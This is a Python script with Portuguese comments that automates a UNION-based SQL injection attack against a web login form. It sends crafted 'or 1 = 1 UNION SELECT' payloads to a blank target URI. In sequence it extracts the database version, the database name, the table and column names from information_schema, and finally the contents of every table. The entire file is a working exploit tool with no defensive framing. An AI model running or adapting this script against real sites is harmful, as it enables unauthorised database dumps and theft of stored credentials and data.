import requests

URI = ''


NOME_BANCO = ''
data_url = {'nome':' '}
spliter = ' <br>Seja bem-vindo a nossa área secreta'
tabelas = {}


def resultado_total(data):
    global URI, spliter
    data_url = {'nome':data}
    req = requests.post(URI, data_url)
    return req.text[1:].replace(spliter, '')


def versao():
    payload = '\' or 1 = 1 UNION SELECT @@version, null, null  limit 3,1#'
    print('Versão do banco: ', resultado_total(payload))




def nome_banco():
    global NOME_BANCO
    
    payload = '\' or 1 = 1 UNION SELECT database(), null, null limit 3,1 #'
    NOME_BANCO = resultado_total(payload)    
    print('Nome do banco: ', NOME_BANCO)



def nome_tabela():
    global tabelas

    payload = '\' or 1 = 1 UNION SELECT table_name, null, null from \
information_schema.tables where table_schema in (SELECT DATABASE()) limit {},1 #'

    ct = 3
    tmp = ''

    while 'senha invalida' not in tmp:
        tmp = resultado_total(payload.format(ct))
        tabelas[tmp] = {}   # o indice 1 é para tirar um caracter special
        print('Nome de tabela: ', tmp)
        ct += 1 
        


def nome_coluna():
    global tabelas
    
    payload = '\' or 1 = 1 UNION SELECT COLUMN_NAME, null, null from information_schema.columns \
where table_name = \'{}\' limit {},1 #'
    
    for i in tabelas:
        ct = 3
        tmp = resultado_total(payload.format(i, ct))
        while 'senha invalida' not in tmp:
            print('Descorbeto a coluna \'{}\' da tabela \'{}\''.format(tmp, i))
            tabelas[i][tmp] = []
            ct += 1 
            tmp = resultado_total(payload.format(i ,ct))


def resultado_tabelas():
    global tabelas
    payload = '\' or 1 = 1 UNION SELECT {}, null, null from {} limit {},1 #'

    for i in tabelas:
        for j in tabelas[i]:
            ct = 3
            tmp = resultado_total(payload.format(j,i,ct))

            while 'senha invalida' not in tmp:
                
                tabelas[i][j].append(tmp)
                ct += 1 
                tmp = resultado_total(payload.format(j,i,ct))
    print(tabelas)

 
if __name__ == '__main__':
    try:
        print('Descobrindo a versão:\n')
        versao()
        print(60*'_'+'\n\nDescobrindo o nome do banco:\n')
        nome_banco()
        print(60*'_'+'\n\nDescobrindo as tabelas:\n')
        nome_tabela()
        print(60*'_'+'\n\nDescobrindo as colunas:\n')
        nome_coluna()
        print(60*'_'+'\n\nMostrando resultado\n')
        resultado_tabelas()
    except KeyboardInterrupt:
        exit()
